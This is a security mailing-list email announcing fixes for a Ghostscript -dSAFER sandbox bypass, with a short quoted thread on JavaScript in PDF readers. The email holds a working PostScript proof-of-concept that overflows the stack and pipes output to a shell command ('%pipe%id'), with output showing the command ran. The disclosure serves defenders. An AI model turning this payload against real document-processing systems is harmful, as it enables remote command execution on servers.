X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2575" "Sunday" "9" "September" "2018" "12:27:26" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLHvDnU2=USrZm2Dtjt0WPfdnqHC2K5q52xCR+qQ7MEpw@mail.gmail.com>" "71" "Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" "^Date:" nil nil "9" "2018090919:27:26" "[oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?" (number mark "        taviso@googl Sep  9   71/2575  " thread-indent "\"Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?\"\n") "<20180906162109.GB19583@takahe.colorado.edu>" ("<20180903105747.dihmczuqhl4kcnx5@suse.de>" "<CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>" "<CAJ_zFk++=BcFw0mU1NefSCkGqo3RzRjePQwPo0mCUzL=QeGBiA@mail.gmail.com>" "<F21BEEA3-4932-472D-9FEA-A318F543861D@gmail.com>" "<CAJ_zFkLmua6XK9iRV-TRQsXKXo=s9Y32FQjOM5UB_UPrrNsAxw@mail.gmail.com>" "<CAJ_zFkLvLBnn8OO6Q3JuqyvpRKoo=63wE1meqsT_jR4USir4DQ@mail.gmail.com>" "<20180905150128.5f9430f4@jabberwock.cb.piermont.com>" "<74d8474f-f18b-7543-a8a8-6072a416aca6@gathman.org>" "<20180905233220.GK1664@takahe.colorado.edu>" "<20180906131725.5dyq5xjweg5ljet4@jwilk.net>" "<20180906162109.GB19583@takahe.colorado.edu>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 28093 invoked by uid 550); 9 Sep 2018 19:27:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28046 invoked from network); 9 Sep 2018 19:27:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=MNGyzq98r4DMSNpjO5Gm5rsymqSaY8tfQirHBVfSG0c=;
        b=fWMBphdKlnrJFF7rjuP2DWCbkbPPex1zV1jXsZ6NCcloEaKP76ZvDLAm0mFzgjWvdD
         Pry3ju2INSLgma9dSyfkmT246oP3mLf/2uZptfOowiT+RJ9jQ9hZGhk/3sVdfW5tA4b6
         h9bsvv/KBHePBQzPa9DQD976/J6onSlWH4QXkCpYT3f5JhmxTBgj/RHsGAW4+/LZS7NH
         1u89S3wmchcWZbiSMIcOzLumFdADG+lTYgNm+i26cv+CjJei8chWS0c5KMKtnnSOJdV+
         pKFP9xj6zq77SQTtuBZtcl0dUhTDswhBWU3q9Knxpa6C2S8Xdy/oN44Rlio6EtIuGuKS
         CIUw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=MNGyzq98r4DMSNpjO5Gm5rsymqSaY8tfQirHBVfSG0c=;
        b=rX+loY9c1weXFb/Kz6dbvIlAQiIKk258ehZf6boqT29LH2XrfAFVkPAbpKTZ8eRLIX
         R9bzoxjfM5L/wdf2deMR3tQ5Fo8xwwfbOTiBNDo/j/gOAexCqSMBT0bZ37hPsHKj24bx
         JIcP/BdQCVgT3rRZ0pxxQReFsw7NAOP0pPH4VdgmMp9cNONTGJ7s0IZSW+VcQ7eLruYr
         W0Q7Duu4BeqdrkRgtngBpn57M89NInGsaTx1dBrOxtax0vrknc8BbuNrqU/oQXgYroo2
         cawL3vG3bZo0Wpa3zLrMkvusVXWe/pSFeIUnU7so0wTHAWRRsYZrf2w1rzVlQ/4K4W42
         /zLQ==
X-Gm-Message-State: APzg51Cpax59dHYzkg3AHqLWtn1VADtjRKy8Sxm5T9HRSmYvl/LYZnFQ
	RUg6qCUBuy222MLe8uKK+omhyytw1egsisBS63FrqdOK2vc=
X-Google-Smtp-Source: ANB0VdZWAaWJ/eX+UJTgoZBeUaWLpacJjNEfPeT2UiBtwyREB296OGtb2/onPHggXWrPpdk5QQacK5sEJYwL6TLQ0DA=
X-Received: by 2002:ac8:2672:: with SMTP id v47-v6mr13165434qtv.287.1536521259400;
 Sun, 09 Sep 2018 12:27:39 -0700 (PDT)
MIME-Version: 1.0
References: <20180903105747.dihmczuqhl4kcnx5@suse.de> <CAJ_zFkLOkSWe8x5N9Mf9bx1J9+oLnzNtHzTfEDXg0JGPj7N7DA@mail.gmail.com>
 <CAJ_zFk++=BcFw0mU1NefSCkGqo3RzRjePQwPo0mCUzL=QeGBiA@mail.gmail.com>
 <F21BEEA3-4932-472D-9FEA-A318F543861D@gmail.com> <CAJ_zFkLmua6XK9iRV-TRQsXKXo=s9Y32FQjOM5UB_UPrrNsAxw@mail.gmail.com>
 <CAJ_zFkLvLBnn8OO6Q3JuqyvpRKoo=63wE1meqsT_jR4USir4DQ@mail.gmail.com>
 <20180905150128.5f9430f4@jabberwock.cb.piermont.com> <74d8474f-f18b-7543-a8a8-6072a416aca6@gathman.org>
 <20180905233220.GK1664@takahe.colorado.edu> <20180906131725.5dyq5xjweg5ljet4@jwilk.net>
 <20180906162109.GB19583@takahe.colorado.edu>
In-Reply-To: <20180906162109.GB19583@takahe.colorado.edu>
Message-ID: <CAJ_zFkLHvDnU2=USrZm2Dtjt0WPfdnqHC2K5q52xCR+qQ7MEpw@mail.gmail.com>
Content-Type: multipart/alternative; boundary="000000000000dbe65c0575753ba7"
Date: Sun, 9 Sep 2018 12:27:26 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Re: More Ghostscript Issues: Should we disable PS
 coders in policy.xml by default?
To: oss-security@lists.openwall.com

--000000000000dbe65c0575753ba7
Content-Type: text/plain; charset="UTF-8"

[resending post that bounced]

Another update, that bypass is now fixed with these commits:

http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=3e5d316b72e3965b7968bb1d96baa137cd063ac6
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=643b24dbd002

The problem was that the previous
<http://git.ghostscript.com/?p=ghostpdl.git&a=commitdiff&h=5812b1b78fc4> commit
relied on catching any errors, then restoring a sane state in the error
handler. That won't work, because the trusted code shares the same operand
stack with untrusted code, so you can (for example) just fill it up with
junk and cause a stack overflow. That causes the stopped proc to stop,
leaving the page device in insecure state ("stopped" is the PostScript
equivalent of "threw an exception").

Here is a test case:

%!PS
% This is bug 699718, trysetparams stopped proc can itself stop, leaving
page device in insecure state
currentpagedevice /PageSize get 0 (foobar) put
a0
% fill up the stack with junk, so the error handler generates a
/stackoverflow
0 1 300360 {} for
{ grestore } stopped clear
(ppmraw) selectdevice
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
showpage

$ ./gs -dSAFER bug699718.txt
GPL Ghostscript GIT PRERELEASE 9.25 (2018-09-03)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.
uid=1000(taviso) gid=1000(primarygroup)

I dunno if I believe there are no other ways to make that fail, I'll think
about it. I can see there are bunch more security related commits in git
that are not from my reports, so I guess there are more on the way anyway.

Tavis.

On Thu, Sep 6, 2018 at 9:27 AM Leonid Isaev <leonid.isaev@jila.colorado.edu>
wrote:

> On Thu, Sep 06, 2018 at 03:17:25PM +0200, Jakub Wilk wrote:
> > * Leonid Isaev <leonid.isaev@jila.colorado.edu>, 2018-09-05, 17:32:
> > > pdf files can contains things like javascript...
> >
> > Do any open-source PDF browsers actually execute embedded JS?
>
> Currently, evince, okular and gv don't. The same goes for zathura with its
> poppler backend (haven't checked this, but pretty sure). But then there is
> also
> Artifex Mupdf which, AFAIR, supports JS in pdf files (by extension, so does
> zathura when viewing a pdf file using the mupdf plugin). I don't know how
> complete that support is. Most importantly, many Android pdf/ebook readers
> probably include JS support.
>
> CHeers,
> L.
>
> --
> Leonid Isaev
>

--000000000000dbe65c0575753ba7--
